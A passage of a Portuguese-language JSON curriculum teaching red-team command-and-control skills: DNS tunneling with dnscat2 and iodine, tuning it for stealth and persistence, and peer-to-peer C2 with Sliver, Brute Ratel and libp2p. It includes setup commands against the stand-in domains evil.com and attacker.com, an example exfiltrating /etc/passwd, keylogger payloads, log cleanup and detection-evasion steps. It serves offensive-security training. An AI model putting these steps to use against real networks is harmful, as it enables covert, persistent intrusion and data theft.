                                    "Simule uma query: ex. payload 'whoami' codificado como subdomínio longo",
                                    "Discuta fluxos: query para comando, response para output"
                                  ],
                                  "verification": "Codifique uma string simples em Base32 e forme uma query DNS manualmente com dig",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Scripts Python para codificação Base32",
                                    "Ferramenta iodine ou dnscat2 para demo",
                                    "Wireshark para inspecionar payloads codificados"
                                  ],
                                  "tips": "Use domínios gratuitos como xip.io para testes locais sem servidor real",
                                  "learningObjective": "Explicar o ciclo completo de C2 via DNS tunneling usando tipos específicos",
                                  "commonMistakes": [
                                    "Esquecer normalização de subdomínios (labels <=63 chars)",
                                    "Não codificar corretamente para evitar parsing DNS",
                                    "Confundir query encoding com response"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar limitações de tamanho e restrições em DNS tunneling",
                                  "subSteps": [
                                    "Calcule limites: 255 bytes por label, 63 chars por label, 512 bytes UDP total sem EDNS",
                                    "Discuta overhead: encoding aumenta tamanho (Base32: 60% overhead)",
                                    "Analise mitigações: rate limiting, whitelisting de domínios, deep packet inspection",
                                    "Compare tipos: TXT suporta multi-string, NULL/CNAME mais limitados",
                                    "Teste limites capturando queries oversized e observando falhas"
                                  ],
                                  "verification": "Liste 5 limitações específicas e calcule tamanho máximo payload para uma query TXT",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Calculadora de tamanho DNS online",
                                    "Wireshark com estatísticas de pacote",
                                    "Relatórios de threat como MITRE ATT&CK T1071.004"
                                  ],
                                  "tips": "Simule com payloads crescentes até falhar para internalizar limites",
                                  "learningObjective": "Quantificar restrições que impactam eficácia de DNS tunneling em C2",
                                  "commonMistakes": [
                                    "Subestimar overhead de encoding",
                                    "Ignorar EDNS(0) que permite >512 bytes",
                                    "Achar DNS sempre UDP sem fallback TCP"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando dnscat2, configure um servidor C2 em um domínio controlado. Do cliente infectado, envie comando 'ls' codificado em Base32 como subdomínio 'bMEXCAYAAAAAAAAAAAAA.example.com' (query NULL). Capture no Wireshark: query carrega payload C2, response TXT retorna output listado, demonstrando ciclo completo apesar de firewall bloqueando portas não-53.",
                              "finalVerifications": [
                                "Explique diferenças entre TXT, NULL e CNAME para payloads C2",
                                "Codifique/decodifique um payload de 100 bytes e calcule tamanho da query DNS",
                                "Desenhe fluxo de tunelamento DNS com labels de query/response",
                                "Liste 4 limitações de tamanho e como burlá-las parcialmente",
                                "Identifique 3 ferramentas comuns para DNS tunneling (ex: iodine, dnscat2)",
                                "Capture e dissecar uma query tunelada em Wireshark"
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica na descrição de registros DNS (TXT/NULL/CNAME)",
                                "Correta quantificação de limites de tamanho e overhead de encoding",
                                "Capacidade de simular e explicar um ciclo C2 completo",
                                "Identificação de mitigações e erros comuns",
                                "Clareza em diagramas e exemplos práticos fornecidos",
                                "Profundidade nas verificações e conexões reais"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos de aplicação e análise de tráfego",
                                "Criptografia: Técnicas de encoding (Base32/64) e ofuscação",
                                "Segurança de Sistemas: IOCs e detecção de C2",
                                "Programação: Scripts para automação de queries DNS",
                                "Análise Forense: Dissecção de pacotes em Wireshark"
                              ],
                              "realWorldApplication": "Em operações Red Team e APTs (ex: SUNBURST pela SolarWinds), DNS tunneling evade firewalls/NAT permitindo C2 persistente e exfiltração de dados sensíveis via queries TXT/NULL para domínios C2, com payloads limitados a ~200 bytes efetivos por query, forçando chunking para arquivos grandes."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.2.2",
                            "name": "Configurar um canal C2 via DNS tunneling",
                            "description": "Implementar um servidor DNS autoritativo com ferramentas como DNScat2 ou Iodine para estabelecer um canal bidirecional de C2.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e instalar ferramentas DNScat2",
                                  "subSteps": [
                                    "Configurar máquinas virtuais isoladas: uma para servidor (atacante) e uma para vítima (alvo).",
                                    "Instalar dependências no servidor Ubuntu/Debian: git, ruby, dnsmasq.",
                                    "Clonar repositório DNScat2: git clone https://github.com/iagox86/dnscat2.git.",
                                    "Compilar e instalar o cliente DNScat2 no alvo (Windows/Linux).",
                                    "Configurar zona DNS personalizada no servidor (ex: evil.com) com ns.evil.com apontando para IP do servidor."
                                  ],
                                  "verification": "Verificar instalação com dnscat2 --help no servidor e cliente funcionando sem erros.",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "VMware/VirtualBox",
                                    "Ubuntu Server ISO",
                                    "Target OS ISO",
                                    "Git",
                                    "Ruby 2.7+"
                                  ],
                                  "tips": [
                                    "Use domínios descartáveis para testes.",
                                    "Teste em rede isolada para evitar detecção real.",
                                    "Documente IPs e domínios usados."
                                  ],
                                  "learningObjective": "Entender pré-requisitos de rede e instalação de ferramentas de tunneling DNS.",
                                  "commonMistakes": [
                                    "Ignorar dependências Ruby causando falhas de compilação.",
                                    "Usar domínios reais sem subdomínio customizado.",
                                    "Não isolar VMs levando a vazamentos de rede."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar servidor DNS autoritativo com DNScat2",
                                  "subSteps": [
                                    "Editar /etc/bind/named.conf.local para adicionar zona evil.com.",
                                    "Criar arquivo de zona /var/cache/bind/db.evil.com com registros NS e wildcard (* para tunneling).",
                                    "Reiniciar BIND: sudo systemctl restart bind9.",
                                    "Executar servidor DNScat2: ./dnscat2 server -c evil.com -dns host=ns.evil.com.",
                                    "Verificar logs do BIND para confirmações de zona carregada."
                                  ],
                                  "verification": "Executar nslookup ns.evil.com no cliente e confirmar resolução para IP do servidor.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "BIND9 instalado",
                                    "Editor de texto (nano/vim)",
                                    "DNScat2 server"
                                  ],
                                  "tips": [
                                    "Use wildcard TXT para payloads grandes.",
                                    "Ajuste TTL baixo para testes rápidos.",
                                    "Monitore /var/log/syslog para erros DNS."
                                  ],
                                  "learningObjective": "Dominar configuração de servidor DNS autoritativo para suportar tunneling.",
                                  "commonMistakes": [
                                    "Sintaxe errada em arquivos de zona causando falha no BIND.",
                                    "Firewall bloqueando porta 53 UDP/TCP.",
                                    "Esquecer de adicionar zona ao named.conf.options."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar cliente e estabelecer túnel C2",
                                  "subSteps": [
                                    "No alvo, executar cliente: ./dnscat2 [IP_SERVIDOR] evil.com ns.evil.com.",
                                    "Aceitar conexão no servidor DNScat2 quando cliente se conectar.",
                                    "Executar comandos básicos no shell remoto: whoami, ls, etc.",
                                    "Testar upload/download de arquivos via canal DNS.",
                                    "Configurar sessões persistentes com --no-exit para reconexão."
                                  ],
                                  "verification": "Shell interativo funcionando com comandos bidirecionais sem perda de dados.",
                                  "estimatedTime": "30 minutes",
                                  "materials": [
                                    "DNScat2 client compilado",
                                    "Rede com conectividade DNS para servidor"
                                  ],
                                  "tips": [
                                    "Aumente tamanho de domínio se payloads falharem.",
                                    "Use proxies DNS se necessário.",
                                    "Teste latência com ping via DNS."
                                  ],
                                  "learningObjective": "Implementar comunicação bidirecional via DNS para C2.",
                                  "commonMistakes": [
                                    "DNS não resolvendo devido a cache no cliente.",
                                    "Cliente usando porta errada ou protocolo.",
                                    "Ignorar certificados ou validações DNSSEC."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, monitorar e limpar canal C2",
                                  "subSteps": [
                                    "Executar payloads reais: keylogger, screenshot via canal.",
                                    "Monitorar tráfego com Wireshark filtrando porta 53 e domínio evil.com.",
                                    "Simular detecção: analisar tamanho de queries/responses para evasão.",
                                    "Encerrar sessão: exit no cliente e kill no servidor.",
                                    "Limpar logs DNS e remover zona para reset."
                                  ],
                                  "verification": "Tráfego DNS tunneling capturado e comandos executados com sucesso; canal fechado sem resquícios.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "Wireshark",
                                    "Scripts de monitoramento",
                                    "Ferramentas de limpeza (rm logs)"
                                  ],
                                  "tips": [
                                    "Registre tamanhos de pacotes para otimização.",
                                    "Teste contra IDS simulados.",
                                    "Automatize com scripts para produção."
                                  ],
                                  "learningObjective": "Avaliar robustez do canal C2 e práticas de OPSEC.",
                                  "commonMistakes": [
                                    "Deixar logs persistentes expostos.",
                                    "Não testar evasão de detecção básica.",
                                    "Túnel timeout por inatividade."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório de Red Team, configure um servidor DNScat2 em AWS com domínio evil.com para conectar a uma VM vítima em rede corporativa simulada. Envie comandos para exfiltrar /etc/passwd e execute whoami, demonstrando bypass de firewall que bloqueia portas comuns.",
                              "finalVerifications": [
                                "Cliente se conecta ao servidor via DNS sem falhas.",
                                "Shell C2 bidirecional permite execução de comandos como ls e download de arquivos.",
                                "Tráfego Wireshark mostra queries TXT codificadas em base32.",
                                "Canal persiste após reinício de rede no cliente.",
                                "Nenhuma porta não-DNS é usada (apenas 53 UDP/TCP).",
                                "Logs confirmam zero erros de resolução DNS."
                              ],
                              "assessmentCriteria": [
                                "Configuração correta de zona DNS autoritativa com wildcard.",
                                "Estabelecimento bem-sucedido de sessão C2 bidirecional.",
                                "Execução de pelo menos 5 comandos remotos sem perda.",
                                "Análise de tráfego demonstrando tunneling DNS.",
                                "Limpeza completa sem artefatos residuais.",
                                "Documentação de passos e troubleshooting."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão profunda de protocolo DNS (RFC 1035).",
                                "Criptografia: Codificação base32/64 para payloads obfuscados.",
                                "Programação: Scripts Ruby para customização DNScat2.",
                                "Segurança Defensiva: Detecção de anomalias em tráfego DNS.",
                                "Ética em Cibersegurança: Uso responsável em simulações."
                              ],
                              "realWorldApplication": "Em operações de Red Team, DNS tunneling permite C2 em redes com firewalls restritivos, bypassando inspeção profunda de pacotes (DPI) para manter acesso persistente em ambientes de alta segurança como bancos ou governos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.4.2.1"
                            ]
                          },
                          {
                            "id": "10.1.5.4.2.3",
                            "name": "Otimizar tunelamento DNS para persistência",
                            "description": "Aplicar técnicas de fragmentação de payloads, codificação base32 e rotação de subdomínios para manter comunicação stealth e resiliente.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Fragmentação de Payloads em DNS Tunneling",
                                  "subSteps": [
                                    "Analisar o tamanho máximo de payloads DNS (tipicamente 255 bytes por query).",
                                    "Dividir payloads grandes em fragmentos menores usando ferramentas como dns-tun ou custom scripts em Python.",
                                    "Implementar reassembly no servidor C2 para reconstruir o payload completo.",
                                    "Testar fragmentação com payloads simulados de comandos shell.",
                                    "Ajustar tamanhos de fragmento para minimizar latência e maximizar stealth."
                                  ],
                                  "verification": "Executar um teste de envio de payload fragmentado de 1KB e confirmar reassembly perfeita no servidor sem erros.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Python 3.x",
                                    "Biblioteca dnslib",
                                    "Servidor DNS local (BIND ou PowerDNS)",
                                    "Lab VM com Kali Linux"
                                  ],
                                  "tips": "Use tamanhos de fragmento pares para alinhamento e inclua headers de sequência para ordenação.",
                                  "learningObjective": "Dominar divisão e reassembly de payloads para evitar rejeições DNS.",
                                  "commonMistakes": [
                                    "Fragmentos maiores que MTU DNS",
                                    "Falta de numeração sequencial levando a perda de ordem",
                                    "Ignorar overhead de encoding"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Codificação Base32 para Ofuscação de Payloads",
                                  "subSteps": [
                                    "Estudar alfabeto Base32 e sua vantagem sobre Base64 em DNS (sem caracteres especiais).",
                                    "Codificar payloads fragmentados usando base32.b32encode em Python.",
                                    "Integrar encoding no cliente e decoding no servidor C2.",
                                    "Testar com payloads binários e texto para validar integridade.",
                                    "Comparar overhead de Base32 vs. outros encodings e otimizar comprimento."
                                  ],
                                  "verification": "Enviar payload codificado Base32 via DNS e decodificar no servidor, comparando hash MD5 original vs. decodificado.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Python base32 module",
                                    "dns-tunnel tool como iodine ou custom script",
                                    "Wireshark para inspeção de tráfego"
                                  ],
                                  "tips": "Pad payloads para múltiplos de 5 bytes para encoding eficiente e evite padding visível.",
                                  "learningObjective": "Aplicar Base32 para tornar payloads DNS não legíveis a analistas manuais.",
                                  "commonMistakes": [
                                    "Uso incorreto de padding levando a erros de decoding",
                                    "Encoding após fragmentação causando overflow",
                                    "Confundir Base32 com Base64 em queries DNS"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Rotação Automática de Subdomínios",
                                  "subSteps": [
                                    "Registrar múltiplos subdomínios wildcard (*.attacker.com) no seu DNS provider.",
                                    "Implementar lógica de rotação no cliente C2 (e.g., ciclo por timestamp ou contador).",
                                    "Configurar servidor C2 para resolver dinamicamente subdomínios rotacionados.",
                                    "Adicionar failover: alternar subdomínios se query falhar.",
                                    "Testar rotação sob bloqueio simulado de subdomínio específico."
                                  ],
                                  "verification": "Simular bloqueio de 3 subdomínios e confirmar que comunicação persiste via rotação automática.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "DNS provider com wildcard (Cloudflare, AWS Route53)",
                                    "Custom C2 framework como Covenant ou Empire modificado",
                                    "Script Python para rotação"
                                  ],
                                  "tips": "Use subdomínios com entropia baixa inicialmente para blending com tráfego normal.",
                                  "learningObjective": "Garantir resiliência contra bloqueios de subdomínio por defensores.",
                                  "commonMistakes": [
                                    "Rotação muito rápida causando rate-limiting",
                                    "Falta de sincronização cliente-servidor",
                                    "Subdomínios não wildcard levando a vazamentos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Técnicas e Testar Persistência Completa",
                                  "subSteps": [
                                    "Combinar fragmentação + Base32 + rotação em um script C2 unificado.",
                                    "Executar beaconing persistente por 24h simuladas com interrupções de rede.",
                                    "Monitorar detecção via logs de SIEM simulados (Splunk/ELK).",
                                    "Otimizar intervalos de query para balancear stealth e responsividade.",
                                    "Documentar configuração para deploy em ambiente adversário."
                                  ],
                                  "verification": "Manter sessão C2 ativa por 1 hora com 50% de perda de pacotes e múltiplos bloqueios de subdomínio.",
                                  "estimatedTime": "3 hours",
                                  "materials": [
                                    "Lab com firewall simulado (pfSense)",
                                    "SIEM tool gratuito (ELK Stack)",
                                    "Custom C2 server"
                                  ],
                                  "tips": "Varie TTLs de DNS para evasão de caching defensivo.",
                                  "learningObjective": "Construir um canal C2 DNS resiliente e stealth para operações longas.",
                                  "commonMistakes": [
                                    "Sobrecarga de queries levando a anomalias",
                                    "Falta de jitter em timings",
                                    "Ignorar rate-limits de DNS upstream"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Otimizar Stealth e Resiliência Final",
                                  "subSteps": [
                                    "Analisar tráfego com Wireshark para signatures detectáveis.",
                                    "Adicionar jitter randômico e mimicry de tráfego legítimo (MX/TXT records).",
                                    "Testar contra detecções comuns (Zeek, Suricata DNS rules).",
                                    "Implementar killswitch para auto-desligar sob detecção.",
                                    "Benchmark performance: throughput, latência, taxa de sucesso."
                                  ],
                                  "verification": "Executar contra honeypot DNS e confirmar zero alerts em logs defensivos.",
                                  "estimatedTime": "2.5 hours",
                                  "materials": [
                                    "Wireshark",
                                    "Suricata/Zeek em VM defensora",
                                    "Honeypot como Cowrie com DNS module"
                                  ],
                                  "tips": "Misture queries C2 com queries benignas para diluição.",
                                  "learningObjective": "Refinar tunnel para operação indetectável em ambientes reais.",
                                  "commonMistakes": [
                                    "Queries periódicas sem jitter",
                                    "Payloads com patterns fixos",
                                    "Alta entropia em subdomínios"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética, configure um agente em uma VM Windows comprometida para tunnelar comandos C2 via DNS para seu servidor em attacker.com. Use fragmentação para enviar screenshot de 500KB, codificado Base32, rotacionando subdomínios como beacon1.attacker.com -> beacon2.attacker.com a cada 10 falhas, mantendo persistência apesar de bloqueios parciais pelo SOC azul.",
                              "finalVerifications": [
                                "Tunnel sobrevive a 30min de blackout de subdomínio específico.",
                                "Payload de 2KB fragmentado e Base32 decodificado sem perda de dados.",
                                "Latência média < 10s para comandos round-trip.",
                                "Zero alerts em Suricata rules para DNS tunneling.",
                                "Throughput sustentável de 1KB/min sem detecção.",
                                "Auto-rotação ativa sem intervenção manual."
                              ],
                              "assessmentCriteria": [
                                "Precisão na fragmentação e reassembly (100% integridade).",
                                "Eficiência de Base32: overhead < 40%.",
                                "Resiliência à rotação: uptime > 95% sob ataques simulados.",
                                "Stealth: entropia de queries similar a tráfego normal.",
                                "Documentação completa de config e troubleshooting.",
                                "Benchmark comparativo vs. tunneling básico."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entendimento profundo de DNS protocol (RFC 1035).",
                                "Programação: Scripting Python para encoding/rotatividade.",
                                "Criptografia: Ofuscação vs. encriptação em canais C2.",
                                "Análise de Malware: Evasão de EDR via DNS persistence.",
                                "Ética em Cibersegurança: Uso responsável em red teaming."
                              ],
                              "realWorldApplication": "Em operações de Red Team durante pentests autorizados, otimizar DNS tunneling permite C2 persistente em redes com tráfego HTTP/HTTPS bloqueado, evadindo firewalls next-gen e mantendo acesso durante hunts de caça ao invasor, como visto em frameworks como Cobalt Strike ou Sliver."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.4.2.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.4.3",
                        "name": "Arquiteturas C2 Peer-to-Peer",
                        "description": "Modelos de C2 descentralizados onde agentes infectados se comunicam diretamente uns com os outros sem um servidor central, aumentando a resiliência contra takedowns e melhorando a evasão.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.4.3.1",
                            "name": "Descrever modelos P2P em frameworks C2",
                            "description": "Explicar arquiteturas P2P em ferramentas como Sliver ou Brute Ratel, incluindo gossip protocols e leader election para coordenação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Arquiteturas P2P em Contextos C2",
                                  "subSteps": [
                                    "Estude definições básicas de C2 centralizado versus descentralizado (P2P).",
                                    "Analise vantagens do P2P: resiliência a falhas de servidor único e evasão de detecção.",
                                    "Revise conceitos de overlay networks e nós pares em ambientes C2.",
                                    "Identifique componentes chave: beacons/implants como nós, canais de comunicação P2P.",
                                    "Compare com modelos client-server tradicionais em ferramentas como Cobalt Strike."
                                  ],
                                  "verification": "Escreva um resumo de 200 palavras comparando C2 centralizado e P2P, destacando pelo menos 3 vantagens do P2P.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação MITRE ATT&CK sobre C2 (T1071)",
                                    "Artigos acadêmicos sobre redes P2P (ex: 'Peer-to-Peer Networking' de Paiolas)",
                                    "Whitepapers de Sliver e Brute Ratel"
                                  ],
                                  "tips": "Use diagramas para visualizar topologias (estrela vs malha).",
                                  "learningObjective": "Diferenciar arquiteturas C2 P2P de tradicionais e listar suas vantagens operacionais.",
                                  "commonMistakes": "Confundir P2P puro com modelos híbridos; ignorar overhead de comunicação em P2P."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Modelo P2P no Framework Sliver",
                                  "subSteps": [
                                    "Instale e configure um ambiente de teste Sliver (use VMs isoladas).",
                                    "Explore comandos para gerar implants P2P e configurar multi-hop C2.",
                                    "Simule comunicação entre peers: observe handshakes e roteamento dinâmico.",
                                    "Descreva o modelo de 'implant chaining' e failover em Sliver.",
                                    "Registre logs de tráfego para identificar padrões P2P."
                                  ],
                                  "verification": "Crie um diagrama da arquitetura P2P do Sliver e explique o fluxo de comandos em um relatório curto.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Repositório GitHub oficial do Sliver (BishopFox)",
                                    "Ambiente de lab: 2-3 VMs com Sliver server e implants",
                                    "Wireshark para captura de pacotes"
                                  ],
                                  "tips": "Teste em rede isolada para evitar detecções; use --skip-symbols para implants leves.",
                                  "learningObjective": "Mapear e descrever o fluxo P2P específico do Sliver, incluindo resiliência.",
                                  "commonMistakes": "Não isolar o lab, levando a falsos positivos de AV; assumir P2P sem configurar operadores corretos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Modelo P2P no Framework Brute Ratel (BRc4)",
                                  "subSteps": [
                                    "Revise documentação BRc4 sobre 'Peer-to-Peer C2' e sleep obfuscation.",
                                    "Configure um operador P2P no BRc4 e implante badgers em múltiplos hosts.",
                                    "Observe coordenação peer: propagação de tarefas e status.",
                                    "Compare com Sliver: destaque diferenças em criptografia e detecção de pivôs.",
                                    "Documente cenários de falha de operador e recuperação P2P."
                                  ],
                                  "verification": "Produza um fluxograma comparativo Sliver vs BRc4 P2P, com 3 diferenças chave.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentação oficial BRc4",
                                    "Licença trial ou lab BRc4 (use alternativas open-source se necessário)",
                                    "Ferramentas de monitoramento: Zeek ou Suricata"
                                  ],
                                  "tips": "Foque em logs de console para entender heartbeats P2P; teste com firewalls simulados.",
                                  "learningObjective": "Descrever arquitetura P2P do BRc4 e contrastá-la com Sliver.",
                                  "commonMistakes": "Ignorar configurações de jitter/sleep que mascaram P2P; confundir com modos proxy."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estudar Protocolos de Coordenação: Gossip e Leader Election",
                                  "subSteps": [
                                    "Aprenda gossip protocols: disseminação probabilística de mensagens (ex: push-pull).",
                                    "Estude leader election em P2P C2: algoritmos como Bully ou Raft adaptados.",
                                    "Implemente um exemplo simples de gossip em Python para C2 simulado.",
                                    "Analise como Sliver/BRc4 usam esses para eleição de pivô ou operador fallback.",
                                    "Avalie trade-offs: latência vs confiabilidade em redes instáveis."
                                  ],
                                  "verification": "Escreva um pseudocódigo de gossip protocol adaptado para C2 e explique leader election em 1 página.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Paper 'Gossip-based Peer Sampling' (Jelasity et al.)",
                                    "Biblioteca Python: gossiper ou networkx para simulações",
                                    "Códigos fonte de Sliver/BRc4 (se disponíveis)"
                                  ],
                                  "tips": "Simule redes com falhas usando Mininet para testar gossip.",
                                  "learningObjective": "Explicar como gossip e leader election habilitam coordenação descentralizada em C2 P2P.",
                                  "commonMistakes": "Subestimar churn (nós entrando/saindo); aplicar protocolos genéricos sem contexto C2 evasivo."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar e Descrever Modelos P2P Completos",
                                  "subSteps": [
                                    "Integre conhecimentos: crie descrição unificada de P2P em Sliver/BRc4.",
                                    "Desenhe arquitetura end-to-end incluindo protocolos de coordenação.",
                                    "Simule um cenário de ataque completo com P2P failover.",
                                    "Prepare apresentação ou relatório final com diagramas e referências.",
                                    "Revise contra IOCs defensivos (ex: tráfego UDP multicast)."
                                  ],
                                  "verification": "Gere um relatório de 1000 palavras descrevendo modelos P2P, validado por peer review.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramentas de diagramação: Draw.io ou Lucidchart",
                                    "Templates de relatório MITRE Engage"
                                  ],
                                  "tips": "Use cores para diferenciar componentes (implants, operadores, protocolos).",
                                  "learningObjective": "Produzir descrição acionável e precisa de modelos P2P em frameworks C2.",
                                  "commonMistakes": "Focar só em teoria sem exemplos práticos; omitir implicações defensivas."
                                }
                              ],
                              "practicalExample": "Em um exercício de red teaming, configure 5 VMs como implants Sliver em P2P. Mate o operador principal; observe gossip propagar status e leader election escolher um pivô para relay de comandos, mantendo C2 ativo apesar de detecção no servidor original.",
                              "finalVerifications": [
                                "Diagrama completo de arquitetura P2P para Sliver e BRc4.",
                                "Pseudocódigo funcional de gossip protocol testado em simulação.",
                                "Relatório explicando leader election com exemplo de failover.",
                                "Lista de 5 IOCs gerados por tráfego P2P (ex: padrões de heartbeat).",
                                "Apresentação de 10min descrevendo modelo end-to-end.",
                                "Comparação tabular: Sliver vs BRc4 vs C2 tradicional."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de topologias P2P (90% cobertura de componentes).",
                                "Profundidade em protocolos gossip/leader election (inclui trade-offs).",
                                "Uso de exemplos práticos e diagramas claros.",
                                "Identificação correta de vantagens/desvantagens operacionais.",
                                "Integração com contexto C2 evasivo (resiliência, evasão).",
                                "Clareza e estrutura do relatório final."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos de roteamento distribuído (BGP, overlay).",
                                "Criptografia: Cifra end-to-end em canais P2P (Noise protocol).",
                                "Sistemas Distribuídos: Consenso e tolerância a falhas (Raft, Paxos).",
                                "Inteligência de Ameaças: Análise de IOCs em tráfego P2P.",
                                "Programação: Implementação de simulações em Python/Go."
                              ],
                              "realWorldApplication": "Em operações de threat hunting ou red teaming, entender P2P C2 permite detectar APTs como APT41 usando Sliver para coordenação descentralizada em infraestruturas comprometidas, permitindo bloqueio de pivôs eleitos via gossip e interrupção de comandos persistentes."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.3.2",
                            "name": "Deployar um agente C2 P2P",
                            "description": "Implantar e configurar um operador P2P utilizando bibliotecas como libp2p, gerenciando peers e rotas de comunicação dinâmica.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Ambiente de Desenvolvimento",
                                  "subSteps": [
                                    "Instale Node.js (versão 18+) e npm/yarn em uma máquina Linux ou VM isolada.",
                                    "Crie um novo projeto Node.js com 'npm init -y'.",
                                    "Instale libp2p e dependências: 'npm install libp2p libp2p-noise libp2p-mdns'.",
                                    "Configure um ambiente virtual com firewall restrito para simular rede isolada.",
                                    "Gere chaves criptográficas para autenticação de peers usando crypto module."
                                  ],
                                  "verification": "Verifique com 'node -v', 'npm list libp2p' e teste de chave gerada sem erros.",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Node.js",
                                    "npm/yarn",
                                    "Libp2p packages",
                                    "VM ou máquina Linux"
                                  ],
                                  "tips": "Use Docker para isolamento total e evite rodar em produção sem sandbox.",
                                  "learningObjective": "Preparar infraestrutura segura para desenvolvimento P2P.",
                                  "commonMistakes": [
                                    "Ignorar versões compatíveis de Node.js",
                                    "Expor portas desnecessárias",
                                    "Não gerar chaves assimétricas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Nó P2P Básico",
                                  "subSteps": [
                                    "Crie um script principal para inicializar um nó libp2p com transporte TCP e protocolo Noise.",
                                    "Configure multiaddrs para descoberta local (ex: /ip4/0.0.0.0/tcp/0).",
                                    "Implemente handler para eventos de peer discovery e conexão.",
                                    "Adicione suporte a MDNS para descoberta automática em rede local.",
                                    "Teste conexão entre dois nós locais com logs de peer ID."
                                  ],
                                  "verification": "Execute dois nós e confirme logs mostrando conexão peer-to-peer mútua.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Código boilerplate libp2p",
                                    "Editor como VS Code",
                                    "Terminal para múltiplas instâncias"
                                  ],
                                  "tips": "Use peerId.toString() para debug de identidades.",
                                  "learningObjective": "Construir base de rede P2P funcional.",
                                  "commonMistakes": [
                                    "Configurar multiaddrs incorretos",
                                    "Esquecer dialer/listener",
                                    "Não lidar com NAT traversal"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver Protocolo de Comunicação C2",
                                  "subSteps": [
                                    "Defina protocolo customizado (ex: /c2/1.0.0) para streams bidirecionais.",
                                    "Implemente envio de comandos do operador (ex: shell_exec) e recebimento de beacons.",
                                    "Adicione criptografia end-to-end com libsodium ou noise.",
                                    "Crie rotas dinâmicas usando DHT para relay de mensagens.",
                                    "Implemente heartbeat para manter peers vivos."
                                  ],
                                  "verification": "Envie comando de um peer para outro e receba resposta criptografada nos logs.",
                                  "estimatedTime": "3 hours",
                                  "materials": [
                                    "Libp2p stream API docs",
                                    "Libsodium para crypto extra"
                                  ],
                                  "tips": "Use protobuf para serialização de payloads C2 eficientes.",
                                  "learningObjective": "Estabelecer canal C2 seguro sobre P2P.",
                                  "commonMistakes": [
                                    "Não multiplexar streams",
                                    "Vazar chaves em logs",
                                    "Ignorar timeouts em rotas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Gerenciar Peers e Rotas Dinâmicas",
                                  "subSteps": [
                                    "Integre Kademlia DHT para bootstrap e descoberta global.",
                                    "Implemente lógica de join/leave de peers com gossipsub.",
                                    "Configure roteamento dinâmico para peers behind NAT usando hole punching.",
                                    "Adicione failover: reconectar automaticamente em falhas de rota.",
                                    "Monitore métricas de peers conectados e latência."
                                  ],
                                  "verification": "Simule 3-5 peers; confirme comandos roteados via DHT sem central server.",
                                  "estimatedTime": "2.5 hours",
                                  "materials": [
                                    "Libp2p DHT examples",
                                    "Ferramentas como ipfs para teste DHT"
                                  ],
                                  "tips": "Limite peers por nó para evitar overload (max 50).",
                                  "learningObjective": "Criar rede C2 resiliente e descentralizada.",
                                  "commonMistakes": [
                                    "Bootstrap nodes hardcoded",
                                    "Não validar peer scores",
                                    "Excesso de gossip flooding"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Empacotar e Deployar Agente",
                                  "subSteps": [
                                    "Crie scripts de teste unitário com múltiplos peers simulados.",
                                    "Empacote como binário standalone com pkg ou Docker.",
